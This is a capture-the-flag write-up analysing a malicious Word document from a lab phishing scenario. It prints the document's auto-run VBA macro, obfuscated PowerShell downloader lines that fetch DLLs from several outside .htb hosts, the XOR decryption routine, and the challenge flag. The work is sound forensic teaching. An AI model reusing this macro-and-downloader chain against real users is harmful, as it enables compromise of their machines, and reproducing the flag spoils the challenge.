> We have been actively monitoring the most extensive spear-phishing campaign in recent history for the last two months.
> This campaign abuses the current crypto market crash to target disappointed crypto owners.
> A company's SOC team detected and provided us with a malicious email and some network traffic assessed to be associated with a user opening the document.
> Analyze the supplied files and figure out what happened.

> Author: **[0xdf][author-profile]**

## Extracting the payload from the doc

### Macros

The document runs a macro when opened:

```shell
olevba2 --deobf --decode --reveal sources/mbcoin.doc > payloads/doc/macros.vba
```

```vba
Sub AutoOpen()
    Dim QQ1 As Object
    Set QQ1 = ActiveDocument.Shapes(1)
    Dim QQ2 As Object
    Set QQ2 = ActiveDocument.Shapes(2)
    RO = StrReverse("\ataDmargorP\:C")
    ROI = RO + StrReverse("sbv.nip")
    ii = StrReverse("")
    Ne = StrReverse("IZOIZIMIZI")
    WW = QQ1.AlternativeText + QQ2.AlternativeText
    MyFile = FreeFile
    Open ROI For Output As #MyFile
    Print #MyFile, WW
    Close #MyFile
    fun = Shell(StrReverse("sbv.nip\ataDmargorP\:C exe.tpircsc k/ dmc"), Chr(48))

    waitTill = Now() + TimeValue("00:00:05")
    While Now() < waitTill
    Wend
    MsgBox ("Unfortunately you are not eligable for free coin!")
    End

End Sub
```

The final command string is reversed in the payload, but OleVBA actually wrangles it for us:

```vba
fun = Shell("cmd /k cscript.exe C:\ProgramData\pin.vbs", "0")
```

### Hidden data

The former macro reads the alternative texts from the shapes in the document to assemble the script `pin.vbs`.

This payload is aimed at Windows users and fairly harmless: let's open it in LibreOffice.

Unfortunately I didn't find any alt text, caption nor hyperlink for the 2 images, in Libreoffice...
Running the macro returns an empty string for `WW` which is supporsed to hold the script text.

Still these texts are stored in the document:

```shell
strings -el sources/mbcoin.doc > payloads/doc/wrapper.vbs
# Normal
# Default Paragraph Font
# Table Normal
# No List
#   mbcoin
# Dim WAITPLZ, WS, k, kl
# WAITPLZ = DateAdd(Chr(115), 4, Now())
# Do Until (Now() > WAITPLZ)
# Loop
# LL1 = "$Nano='JOOEX'.replace('JOO','I');sal OY $Nano;$aa='(New-Ob'; $qq='ject Ne'; $ww='t.WebCli'; $ee='ent).Downl'; $rr='oadFile'; $bb='(''http://priyacareers.htb/u9hDQN9Yy7g/pt.html'',''C:\ProgramData\www1.dll'')';$FOOX =($aa,$qq,$ww,$ee,$rr,$bb,$cc -Join ''); OY $FOOX|OY;"
# LL2 = "$Nanoz='JOOEX'.replace('JOO','I');sal OY $Nanoz;$aa='(New-Ob'; $qq='ject Ne'; $ww='t.WebCli'; $ee='ent).Downl'; $rr='oadFile'; $bb='(''https://perfectdemos.htb/Gv1iNAuMKZ/jv.html'',''C:\ProgramData\www2.dll'')';$FOOX =($aa,$qq,$ww,$ee,$rr,$bb,$cc -Join ''); OY $FOOX|OY;"
# LL3 = "$Nanox='JOOEX'.replace('JOO','I');sal OY $Nanox;$aa='(New-Ob'; $qq='ject Ne'; $ww='t.WebCli'; $ee='ent).Downl'; $rr='oadFile'; $bb='(''http://bussiness-z.htb/ze8pCNTIkrIS/wp.html'',''C:\ProgramData\www3.dll'')';$FOOX =($aa,$qq,$ww,$ee,$rr,$bb,$cc -Join ''); OY $FOOX|OY;"
# LL4 = "$Nanoc='JOOEX'.replace('JOO','I');sal OY $Nanoc;$aa='(New-Ob'; $qq='ject Ne'; $ww='t.WebCli'; $ee='ent).Downl'; $rr='oadFile'; $bb='(''http://cablingpoint.htb/ByH5NDoE3kQA/vm.html'',''C:\ProgramData\www4.dll'')';$FOOX =($aa,$qq,$ww,$ee,$rr,$bb,$cc -Join ''); OY $FOOX|OY;"
# LL5 = "$Nanoc='JOOEX'.replace('JOO','I');sal OY $Nanoc;$aa='(New-Ob'; $qq='ject Ne'; $ww='t.WebCli'; $ee='ent).Downl'; $rr='oadFile'; $bb='(''https://bonus.corporatebusinessmachines.htb/1Y0qVNce/tz.html'',''C:\ProgramData\www5.dll'')';$FOOX =($aa,$qq,$ww,$ee,$rr,$bb,$cc -Join ''); OY $FOOX|OY;"
# HH9="po"
# ...
```

The script is separated in two blocks in the documents, so the lines are mostly listed the right order in the previous output.

There's some pretty straightforward obfuscation:

```powershell
$Nano='JOOEX'.replace('JOO','I');
$aa='(New-Ob';
$qq='ject Ne';
$ww='t.WebCli';
$ee='ent).Downl';
$rr='oadFile';
```

## Deofuscating the payload

### Unwrapping

The script can be cleared by hand, but it's still tedious.

It is actually a VBS wrapper that runs Powershell commands stored in the variables `LL1`, `LL2`, etc.

Getting rid of the VBS calls to powershell and the string wrapping, we get:

```powershell
$Nano='JOOEX'.replace('JOO','I');sal OY $Nano;$aa='(New-Ob'; $qq='ject Ne'; $ww='t.WebCli'; $ee='ent).Downl'; $rr='oadFile'; $bb='(''http://priyacareers.htb/u9hDQN9Yy7g/pt.html'',''C:\ProgramData\www1.dll'')';$FOOX =($aa,$qq,$ww,$ee,$rr,$bb,$cc -Join ''); OY $FOOX|OY;
$Nanoz='JOOEX'.replace('JOO','I');sal OY $Nanoz;$aa='(New-Ob'; $qq='ject Ne'; $ww='t.WebCli'; $ee='ent).Downl'; $rr='oadFile'; $bb='(''https://perfectdemos.htb/Gv1iNAuMKZ/jv.html'',''C:\ProgramData\www2.dll'')';$FOOX =($aa,$qq,$ww,$ee,$rr,$bb,$cc -Join ''); OY $FOOX|OY;
$Nanox='JOOEX'.replace('JOO','I');sal OY $Nanox;$aa='(New-Ob'; $qq='ject Ne'; $ww='t.WebCli'; $ee='ent).Downl'; $rr='oadFile'; $bb='(''http://bussiness-z.htb/ze8pCNTIkrIS/wp.html'',''C:\ProgramData\www3.dll'')';$FOOX =($aa,$qq,$ww,$ee,$rr,$bb,$cc -Join ''); OY $FOOX|OY;
$Nanoc='JOOEX'.replace('JOO','I');sal OY $Nanoc;$aa='(New-Ob'; $qq='ject Ne'; $ww='t.WebCli'; $ee='ent).Downl'; $rr='oadFile'; $bb='(''http://cablingpoint.htb/ByH5NDoE3kQA/vm.html'',''C:\ProgramData\www4.dll'')';$FOOX =($aa,$qq,$ww,$ee,$rr,$bb,$cc -Join ''); OY $FOOX|OY;
$Nanoc='JOOEX'.replace('JOO','I');sal OY $Nanoc;$aa='(New-Ob'; $qq='ject Ne'; $ww='t.WebCli'; $ee='ent).Downl'; $rr='oadFile'; $bb='(''https://bonus.corporatebusinessmachines.htb/1Y0qVNce/tz.html'',''C:\ProgramData\www5.dll'')';$FOOX =($aa,$qq,$ww,$ee,$rr,$bb,$cc -Join ''); OY $FOOX|OY;
```

And:

```powershell
$b = [System.IO.File]::ReadAllBytes((('C:GPH'+'pr'+'og'+'ra'+'mdataG'+'PHwww1.d'+'ll')  -CrePLacE'GPH',[Char]92)); $k = ('6i'+'I'+'gl'+'o'+'Mk5'+'iRYAw'+'7Z'+'TWed0Cr'+'juZ9wijyQDj'+'KO'+'9Ms0D8K0Z2H5MX6wyOKqFxl'+'Om1'+'X'+'pjmYfaQX'+'acA6'); $r = New-Object Byte[] $b.length; for($i=0; $i -lt $b.length; $i++){$r[$i] = $b[$i] -bxor $k[$i%$k.length]}; if ($r.length -gt 0) { [System.IO.File]::WriteAllBytes((('C:Y9Apro'+'gramdat'+'a'+'Y'+'9Awww'+'.d'+'ll').REpLace(([chAr]89+[chAr]57+[chAr]65),[sTriNg][chAr]92)), $r)}
$b = [System.IO.File]::ReadAllBytes((('C:GPH'+'pr'+'og'+'ra'+'mdataG'+'PHwww2.d'+'ll')  -CrePLacE'GPH',[Char]92)); $k = ('6i'+'I'+'pc'+'o'+'Mk5'+'iRYAw'+'7Z'+'TWed0Cr'+'juZ9wijyQDj'+'Au'+'9Ms0D8K0Z2H5MX6wyOKqFxl'+'Om1'+'P'+'pjmYfaQX'+'acA6'); $r = New-Object Byte[] $b.length; for($i=0; $i -lt $b.length; $i++){$r[$i] = $b[$i] -bxor $k[$i%$k.length]};  if ($r.length -gt 0) {[System.IO.File]::WriteAllBytes((('C:Y9Apro'+'gramdat'+'a'+'Y'+'9Awww'+'.d'+'ll').REpLace(([chAr]89+[chAr]57+[chAr]65),[sTriNg][chAr]92)), $r)}
$b = [System.IO.File]::ReadAllBytes((('C:GPH'+'pr'+'og'+'ra'+'mdataG'+'PHwww3.d'+'ll')  -CrePLacE'GPH',[Char]92)); $k = ('6i'+'I'+'WG'+'o'+'Mk5'+'iRYAw'+'7Z'+'TWed0Cr'+'juZ9wijyQDj'+'OL'+'9Ms0D8K0Z2H5MX6wyOKqFxl'+'Om1'+'s'+'pjmYfaQX'+'acA6'); $r = New-Object Byte[] $b.length; for($i=0; $i -lt $b.length; $i++){$r[$i] = $b[$i] -bxor $k[$i%$k.length]}; if ($r.length -gt 0) { [System.IO.File]::WriteAllBytes((('C:Y9Apro'+'gramdat'+'a'+'Y'+'9Awww'+'.d'+'ll').REpLace(([chAr]89+[chAr]57+[chAr]65),[sTriNg][chAr]92)), $r)}
$b = [System.IO.File]::ReadAllBytes((('C:GPH'+'pr'+'og'+'ra'+'mdataG'+'PHwww4.d'+'ll')  -CrePLacE'GPH',[Char]92)); $k = ('6i'+'I'+'oN'+'o'+'Mk5'+'iRYAw'+'7Z'+'TWed0Cr'+'juZ9wijyQDj'+'Py'+'9Ms0D8K0Z2H5MX6wyOKqFxl'+'Om1'+'G'+'pjmYfaQX'+'acA6'); $r = New-Object Byte[] $b.length; for($i=0; $i -lt $b.length; $i++){$r[$i] = $b[$i] -bxor $k[$i%$k.length]}; if ($r.length -gt 0) { [System.IO.File]::WriteAllBytes((('C:Y9Apro'+'gramdat'+'a'+'Y'+'9Awww'+'.d'+'ll').REpLace(([chAr]89+[chAr]57+[chAr]65),[sTriNg][chAr]92)), $r)}
$b = [System.IO.File]::ReadAllBytes((('C:GPH'+'pr'+'og'+'ra'+'mdataG'+'PHwww5.d'+'ll')  -CrePLacE'GPH',[Char]92)); $k = ('6i'+'I'+'IE'+'o'+'Mk5'+'iRYAw'+'7Z'+'TWed0Cr'+'juZ9wijyQDj'+'YL'+'9Ms0D8K0Z2H5MX6wyOKqFxl'+'Om1'+'a'+'pjmYfaQX'+'acA6'); $r = New-Object Byte[] $b.length; for($i=0; $i -lt $b.length; $i++){$r[$i] = $b[$i] -bxor $k[$i%$k.length]}; if ($r.length -gt 0) {[System.IO.File]::WriteAllBytes((('C:Y9Apro'+'gramdat'+'a'+'Y'+'9Awww'+'.d'+'ll').REpLace(([chAr]89+[chAr]57+[chAr]65),[sTriNg][chAr]92)), $r)}
```

### Factoring the code

#### LL

`OY` is an alias for `IEX` which stands for `Invoke-Expression` in Powershell.

Each statement is recomposed from partial strings and fed to `OY`.

Stripping the execution, we can just decrypt each command stored in `FOOX`:

```
(New-Object Net.WebClient).DownloadFile('http://priyacareers.htb/u9hDQN9Yy7g/pt.html','C:\ProgramData\www1.dll')
(New-Object Net.WebClient).DownloadFile('https://perfectdemos.htb/Gv1iNAuMKZ/jv.html','C:\ProgramData\www2.dll')
(New-Object Net.WebClient).DownloadFile('http://bussiness-z.htb/ze8pCNTIkrIS/wp.html','C:\ProgramData\www3.dll')
(New-Object Net.WebClient).DownloadFile('http://cablingpoint.htb/ByH5NDoE3kQA/vm.html','C:\ProgramData\www4.dll')
(New-Object Net.WebClient).DownloadFile('https://bonus.corporatebusinessmachines.htb/1Y0qVNce/tz.html','C:\ProgramData\www5.dll')
```

So this first script attempts to download the same file from 5 different sources.

This is confirmed by the network capture:

```shell
tcpdump -n -r sources/mbcoin.pcapng 'port 53' | grep -E 'priyacareers.htb|perfectdemos.htb|bussiness-z.htb|cablingpoint.htb|corporatebusinessmachines.htb'
# reading from file sources/mbcoin.pcapng, link-type EN10MB (Ethernet), snapshot length 262144
# 16:04:59.334365 IP 10.1.1.163.49855 > 10.1.1.5.53: 10518+ A? cablingpoint.htb. (34)
# 16:04:59.337119 IP 10.1.1.163.49357 > 10.1.1.5.53: 12376+ A? bussiness-z.htb. (33)
# 16:04:59.343035 IP 10.1.1.163.63514 > 10.1.1.5.53: 35380+ A? bonus.corporatebusinessmachines.htb. (53)
# 16:04:59.350178 IP 10.1.1.163.52320 > 10.1.1.5.53: 56719+ A? perfectdemos.htb. (34)
# 16:04:59.350397 IP 10.1.1.163.55521 > 10.1.1.5.53: 9479+ A? priyacareers.htb. (34)
```

#### MM

similarly, the lines of the second script can be simplified:

```
$b = [System.IO.File]::ReadAllBytes('C:\programdata\www1.dll'); $k = '6iIgloMk5iRYAw7ZTWed0CrjuZ9wijyQDjKO9Ms0D8K0Z2H5MX6wyOKqFxlOm1XpjmYfaQXacA6'; $r = New-Object Byte[] $b.length; for($i=0; $i -lt $b.length; $i++){$r[$i] = $b[$i] -bxor $k[$i%$k.length]}; if ($r.length -gt 0) {[System.IO.File]::WriteAllBytes('C:\programdata\www.dll', $r)}
$b = [System.IO.File]::ReadAllBytes('C:\programdata\www2.dll'); $k = '6iIpcoMk5iRYAw7ZTWed0CrjuZ9wijyQDjAu9Ms0D8K0Z2H5MX6wyOKqFxlOm1PpjmYfaQXacA6'; $r = New-Object Byte[] $b.length; for($i=0; $i -lt $b.length; $i++){$r[$i] = $b[$i] -bxor $k[$i%$k.length]}; if ($r.length -gt 0) {[System.IO.File]::WriteAllBytes('C:\programdata\www.dll', $r)}
$b = [System.IO.File]::ReadAllBytes('C:\programdata\www3.dll'); $k = '6iIWGoMk5iRYAw7ZTWed0CrjuZ9wijyQDjOL9Ms0D8K0Z2H5MX6wyOKqFxlOm1spjmYfaQXacA6'; $r = New-Object Byte[] $b.length; for($i=0; $i -lt $b.length; $i++){$r[$i] = $b[$i] -bxor $k[$i%$k.length]}; if ($r.length -gt 0) {[System.IO.File]::WriteAllBytes('C:\programdata\www.dll', $r)}
$b = [System.IO.File]::ReadAllBytes('C:\programdata\www4.dll'); $k = '6iIoNoMk5iRYAw7ZTWed0CrjuZ9wijyQDjPy9Ms0D8K0Z2H5MX6wyOKqFxlOm1GpjmYfaQXacA6'; $r = New-Object Byte[] $b.length; for($i=0; $i -lt $b.length; $i++){$r[$i] = $b[$i] -bxor $k[$i%$k.length]}; if ($r.length -gt 0) {[System.IO.File]::WriteAllBytes('C:\programdata\www.dll', $r)}
$b = [System.IO.File]::ReadAllBytes('C:\programdata\www5.dll'); $k = '6iIIEoMk5iRYAw7ZTWed0CrjuZ9wijyQDjYL9Ms0D8K0Z2H5MX6wyOKqFxlOm1apjmYfaQXacA6'; $r = New-Object Byte[] $b.length; for($i=0; $i -lt $b.length; $i++){$r[$i] = $b[$i] -bxor $k[$i%$k.length]}; if ($r.length -gt 0) {[System.IO.File]::WriteAllBytes('C:\programdata\www.dll', $r)}
```

It tries to decrypt each of the potential sources into a DLL.
The key is slightly different from file to file.

## Decrypting the malware DLL

### XOR

Out of the 5, only 2 URLs resolved:
thanks to Wireshark we can follow the streams for both file downloads and get the objects `pt.html` and `vm.html`.

Then decrypt with XOR:

```python
for __payload in PAYLOADS:
    with open(__payload['inpath'], 'rb') as __infile:
        __raw = __infile.read()
        __clear = xor(__raw, __payload['key'])
        with open(__payload['outpath'], 'wb') as __outfile:
            __outfile.write(__clear)
```

### Verification

The 2 objects extracted from the network capture should have the same size:

```shell
ls payloads/dll
# 4458066 12 -rw-r--r-- 1 flatline flatline 10752 Aug 26 22:12 pt.html
# 4458067 12 -rw-r--r-- 1 flatline flatline 10752 Aug 26 22:12 vm.html
# 4458724 12 -rw-r--r-- 1 flatline flatline 10752 Aug 29 10:00 www1.dll
# 4458725 12 -rw-r--r-- 1 flatline flatline 10752 Aug 29 10:00 www4.dll
```

The resulting files don't store the flag as is, but they are legit DLLs:

```shell
strings -n 16 payloads/dll/www1.dll
# !This program cannot be run in DOS mode.
# Z:\hackthebox-submissions\202207-business-ctf-mbcoin\mbcoin\mbcoin\x64\Release\mbcoin.pdb
# __C_specific_handler
# __std_type_info_destroy_list
# VCRUNTIME140.dll
# _configure_narrow_argv
# _initialize_narrow_environment
# _initialize_onexit_table
# _execute_onexit_table
# api-ms-win-crt-runtime-l1-1-0.dll
# RtlCaptureContext
# RtlLookupFunctionEntry
# RtlVirtualUnwind
# UnhandledExceptionFilter
# SetUnhandledExceptionFilter
# GetCurrentProcess
# TerminateProcess
# IsProcessorFeaturePresent
# QueryPerformanceCounter
# GetCurrentProcessId
# GetCurrentThreadId
# GetSystemTimeAsFileTime
# InitializeSListHead
# IsDebuggerPresent
# <?xml version='1.0' encoding='UTF-8' standalone='yes'?>
# <assembly xmlns='urn:schemas-microsoft-com:asm.v1' manifestVersion='1.0'>
```

## Decompiling the DLL

Actually Ghidra shows that the two DLLs differ!

The target function `ldr` displays a different message on each:

```c
MessageBoxW((HWND)0x0,L"Are you sure this is the DLL that executed on the system?",L"Oops",0);
MessageBoxW((HWND)0x0,L"HTB{wH4tS_4_sQuirReLw4fFl3?}",L"Congratulations!",0);
```

> `HTB{wH4tS_4_sQuirReLw4fFl3?}`

[author-profile]: https://app.hackthebox.com/users/4935
